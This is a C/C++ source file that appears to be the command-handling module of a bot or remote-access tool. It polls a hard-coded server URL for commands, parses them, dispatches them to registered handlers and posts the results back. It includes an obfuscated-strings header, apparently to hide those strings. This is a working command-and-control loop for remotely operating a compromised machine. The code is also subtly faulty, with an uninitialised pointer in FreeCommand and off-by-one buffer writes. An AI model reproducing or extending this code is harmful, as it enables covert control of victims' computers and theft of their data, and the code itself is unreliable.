#include "../include/ComManager.h"
#include "../../shared/include/maindef.h"
#include <stdio.h>
#include "../../shared/include/ofuscstring.h"
FUNCTIONCOMMAND *pFunctionTab=NULL;


void CreateCommand(COMMAND **pCommand){
     *pCommand=(COMMAND *)malloc(sizeof(COMMAND));
     if (*pCommand) {
        (*pCommand)->pNext=(*pCommand)->pPrev=NULL;
        (*pCommand)->commandResult=(*pCommand)->numParameters=0;
        (*pCommand)->sCommandResult[0]=0;
     }
}

void CreateParam(COMMANDPARAMETERS **pParam){
     *pParam =(COMMANDPARAMETERS *)malloc(sizeof(COMMANDPARAMETERS));
     if (*pParam)
        (*pParam)->pNext=NULL;
}

int ReadParam(char *ptr, DWORD dwLenght, COMMAND *pCommand) {
    int i;
    char *initPtr;char tmp[_MAXSTRLEN];
    COMMANDPARAMETERS *pParam,*pLastParam=NULL;
    
    initPtr=ptr;

    while ((ptr-initPtr)<dwLenght) {

          if ((dwLenght-(ptr-initPtr))<strlen(_PARAMCHAIN) || strncmp(ptr,_PARAMCHAIN,strlen(_PARAMCHAIN)))
              return _ERROR_CMD_INVALID;

          ptr+=strlen(_PARAMCHAIN);
          i=0;
          while (*ptr!='\n' && *ptr!= '\r' && (ptr-initPtr)<dwLenght && i<_MAXSTRLEN)
                tmp[i++]=*ptr++;
          if (*ptr=='\r')
             ptr++;
          tmp[i]=0;ptr++;
          CreateParam(&pParam);
          if (!pParam)
             return _ERROR_SYS_MALOCFAILED;
             
          pCommand->numParameters++;
          strncpy(pParam->sParam,tmp,i+1);
          
          if (pLastParam!=NULL)
             pLastParam->pNext=pParam;
          else
              pCommand->pFirstParameters=pParam;
          pLastParam=pParam;
    }
    return _ERROR_NO_ERROR;
}

int ReadCommand(char *ptr, DWORD dwLenght, COMMAND *pCommand) {
    char tmp[_MAXSTRLEN];
    int i=0;char *initPtr;
      //  MessageBox( HWND_DESKTOP, "1", "Error", MB_OK );
    initPtr=ptr;
    if (dwLenght<strlen(_COMMANDCHAIN))
       return _ERROR_CMD_INVALID;
   // MessageBox( HWND_DESKTOP, "2", "Error", MB_OK );
    if (strncmp(ptr,_COMMANDCHAIN,strlen(_COMMANDCHAIN))!=0)
       return _ERROR_CMD_INVALID;
    
    ptr+=strlen(_COMMANDCHAIN);
    while (*ptr!='\n' && *ptr!='\r' && i<_MAXSTRLEN && ((ptr-initPtr)<dwLenght))
          tmp[i++]=*ptr++;
    tmp[i]=0;
    if (*ptr=='\r')
       ptr++;
       
    pCommand->command=atoi(tmp);
    ptr++;
 //   MessageBox( HWND_DESKTOP, "3", "Error", MB_OK );    
    if (((ptr-initPtr)+strlen(_IDCHAIN)) > dwLenght)
       return _ERROR_CMD_INVALID;
   // MessageBox( HWND_DESKTOP, "4", "Error", MB_OK );
    if (strncmp(ptr,_IDCHAIN,strlen(_IDCHAIN))!=0)
       return _ERROR_CMD_INVALID;
        pCommand->numParameters=0;
   // MessageBox( HWND_DESKTOP, "5", "Error", MB_OK );
    ptr+=strlen(_IDCHAIN);i=0;
    while (*ptr!='\n' && *ptr!='\r' && (i<_MAXSTRLEN) && ((ptr-initPtr)<dwLenght))
          tmp[i++]=*ptr++;
    
    if (*ptr=='\r')
       ptr++;
    tmp[i]=0;
    pCommand->idCommand=atoi(tmp);
    ptr++;

    return ReadParam(ptr,dwLenght-(ptr-initPtr),pCommand);
}

void FinalizeCommand(API *pAPI,COMMAND *pCommand) {
     COMMANDPARAMETERS *pParameters1,*pParameters2;
     char src[MAX_BUFFER], sDATA[MAX_BUFFER];
     
     sprintf(src, "%s?result=%i&idCommand=%i",STR_MAIN_URL,pCommand->commandResult,pCommand->idCommand);
     CHTTPClass *oHTTPClient;
     oHTTPClient=new CHTTPClass(pAPI);
     oHTTPClient->SetURL(src);
    
     if (pCommand->sCommandResult[0]!=0){
        sprintf(sDATA, "commandResult=%s",pCommand->sCommandResult);
        oHTTPClient->SetPOSTData(sDATA);
     }    
    
     oHTTPClient->Connect();
     oHTTPClient->SendRequest();
     //pC=oHTTPClient->ReadHTTPHeader();
     delete(oHTTPClient);
     pParameters1=pCommand->pFirstParameters;
     while (pParameters1!=NULL) {
           pParameters2=pParameters1;
           pParameters1=pParameters2->pNext;
           free(pParameters2);
     }
     free(pCommand);
}


COMMAND *CheckCommand(API *pAPI) {
        char *pC;DWORD dwDataLenght;
        CHTTPClass *oHTTPClient;
        COMMAND *pCommand;
        char *ptr;int result;

        oHTTPClient=new CHTTPClass(pAPI);
        oHTTPClient->SetURL(STR_MAIN_URL);
        oHTTPClient->Connect();
        oHTTPClient->SendRequest();
        pC=oHTTPClient->ReadHTTPHeader();

        if (!pC || oHTTPClient->HTTPErrorCode(pC)!=_HTTP_OK) {
           delete(oHTTPClient);
           return NULL;                                              
        }
    
        pC=oHTTPClient->ReadHTTPData(&dwDataLenght);
        pC[dwDataLenght]=0;
       
        ptr=pC;
                
        if (*pC=='0')
        {
           delete(oHTTPClient);
          // MessageBox( HWND_DESKTOP, "This application does not run under WIN32s!", "Error", MB_OK );
           return NULL;
        }
        CreateCommand(&pCommand);
        if (!pCommand)
           return NULL;
        
        if (result=ReadCommand(pC,dwDataLenght,pCommand)) {

             delete(oHTTPClient);
             pCommand->commandResult=result;
             FinalizeCommand(pAPI,pCommand);
             return NULL;
        }

       delete(oHTTPClient);
       return pCommand;
}

BOOL ReferenceCommand(int command,fnCOMMAND pCommand){
     FUNCTIONCOMMAND *ptr,*pFunction;
     
     pFunction=(FUNCTIONCOMMAND *)malloc(sizeof(FUNCTIONCOMMAND));
     if (!pFunction)
        return false;
        
     pFunction->command=command;
     pFunction->pPtrCommand=pCommand;
     pFunction->pNext=NULL;
     
     if (!pFunctionTab)
        pFunctionTab=pFunction;                   
     else {
          ptr=pFunctionTab;
          while (ptr->pNext)
                ptr=ptr->pNext;
          ptr->pNext=pFunction;
     }
     
     return true;
}

void FreeCommand(void){
    FUNCTIONCOMMAND *ptr1,*ptr2;
    ptr1=pFunctionTab;
    
    while (ptr1!=NULL) {
        ptr1=ptr2->pNext;
        free(ptr2);  
    }
}

int ExecuteCommand(API *pApi, COMMAND *pCommand) {
       FUNCTIONCOMMAND *ptr;
       
       ptr=pFunctionTab;
       while (ptr) {          
             if (ptr->command==pCommand->command) {
                return (*ptr->pPtrCommand)(pApi,pCommand);
             }
             ptr=ptr->pNext;
      }
      return _ERROR_CMD_COMMANDNOTFOUND;
}
